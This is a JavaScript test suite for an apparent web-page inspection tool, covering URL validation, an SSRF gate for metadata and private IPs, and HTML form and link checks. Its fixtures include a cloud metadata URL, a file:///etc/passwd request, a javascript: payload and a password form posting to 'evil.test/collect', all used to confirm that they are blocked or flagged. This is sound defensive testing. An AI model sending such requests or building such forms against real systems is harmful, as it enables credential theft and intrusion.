import { test } from 'node:test'
import assert from 'node:assert/strict'
import { parseUrl, blockedIpReason } from '../dist/authorize.js'
import { frame, extractStructure } from '../dist/html.js'
import { observe } from '../dist/observe.js'

test('parseUrl: accepts a bare host as https, keeps a full URL', () => {
  assert.equal(parseUrl('example.com').url, 'https://example.com/')
  assert.equal(parseUrl('https://x.io/a?b=1').ok, true)
})

test('parseUrl: refuses non-http(s), credentials, metadata, and lists', () => {
  assert.equal(parseUrl('file:///etc/passwd').ok, false)
  assert.equal(parseUrl('javascript:alert(1)').ok, false)
  assert.equal(parseUrl('data:text/html,<h1>x').ok, false)
  assert.equal(parseUrl('https://user:pw@x.io').ok, false)
  assert.equal(parseUrl('http://169.254.169.254/').ok, false)
  assert.equal(parseUrl('http://a.com, http://b.com').ok, false)
})

test('blockedIpReason: SSRF gate covers metadata, link-local, loopback, private', () => {
  assert.ok(blockedIpReason('169.254.169.254'))
  assert.ok(blockedIpReason('169.254.1.1'))
  assert.ok(blockedIpReason('127.0.0.1'))
  assert.ok(blockedIpReason('10.0.0.5'))
  assert.ok(blockedIpReason('192.168.1.1'))
  assert.ok(blockedIpReason('172.16.0.1'))
  assert.equal(blockedIpReason('93.184.216.34'), null) // public → allowed
})

test('frame: passes clean text through, decodes entities, flags nothing stripped', () => {
  const f = frame('Hello &amp; welcome')
  assert.equal(f.text, 'Hello & welcome')
  assert.equal(f.stripped, 0)
})

test('extractStructure: title, lang, headings, meta, scripts, imgs', () => {
  const html = `<!doctype html><html lang="en"><head>
    <title>My &amp; Page</title>
    <meta name="description" content="a demo">
    <meta name="viewport" content="width=device-width">
    <script src="https://cdn.other.com/a.js"></script>
    <script>console.log(1)</script>
  </head><body>
    <h1>Top</h1><h3>Skips a level</h3>
    <img src="/a.png" alt="a"><img src="/b.png">
  </body></html>`
  const { structure } = extractStructure(html, new URL('https://site.test/'))
  assert.equal(structure.title?.text, 'My & Page')
  assert.equal(structure.lang, 'en')
  assert.equal(structure.metaDescription?.text, 'a demo')
  assert.deepEqual(structure.headings.map((h) => h.level), [1, 3])
  assert.deepEqual(structure.scriptOrigins, ['https://cdn.other.com'])
  assert.equal(structure.inlineScripts, 1)
  assert.equal(structure.imgCount, 2)
  assert.equal(structure.imgMissingAlt, 1)
})

test('extractStructure: forms flag insecure/cross-origin/sensitive targets', () => {
  const html = `<html><body>
    <form action="http://evil.test/collect" method="post">
      <input name="username"><input name="password" type="password">
    </form>
    <form action="/local"><input name="q"></form>
  </body></html>`
  const { forms } = extractStructure(html, new URL('https://bank.test/login'))
  const login = forms[0]
  assert.equal(login.method, 'POST')
  assert.equal(login.insecureTarget, true) // https page → http action
  assert.equal(login.crossOrigin, true)
  assert.equal(login.sensitive, true) // has a password field
  assert.equal(forms[1].sensitive, false)
  assert.equal(forms[1].crossOrigin, false)
})

test('extractStructure: external target=_blank without rel=noopener is flagged', () => {
  const html = `<a href="https://other.test/x" target="_blank">out</a>
                <a href="https://other.test/y" target="_blank" rel="noopener">safe</a>
                <a href="/internal">in</a>`
  const { links } = extractStructure(html, new URL('https://me.test/'))
  assert.equal(links[0].unsafeBlank, true)
  assert.equal(links[1].unsafeBlank, false)
  assert.equal(links[2].external, false)
})

test('observe: SSRF-blocks a literal metadata URL before any fetch (isError)', async () => {
  const brief = await observe('http://169.254.169.254/latest/meta-data/')
  assert.ok(brief.error)
  assert.match(brief.error!, /metadata|SSRF/i)
})

test('observe: refuses a non-http(s) scheme', async () => {
  const brief = await observe('file:///etc/passwd')
  assert.ok(brief.error)
  assert.match(brief.error!, /http\(s\)/)
})
